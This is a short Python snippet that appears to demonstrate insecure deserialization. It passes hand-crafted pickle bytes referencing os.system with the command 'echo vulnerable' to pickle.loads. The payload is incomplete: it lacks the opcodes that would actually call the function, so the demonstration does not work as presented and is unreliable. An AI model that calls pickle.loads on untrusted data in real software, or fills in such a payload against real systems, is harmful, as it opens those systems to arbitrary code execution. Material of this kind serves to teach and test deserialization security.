import pickle

data = b"cos\nsystem\n(S'echo vulnerable'\n."

result = pickle.loads(data)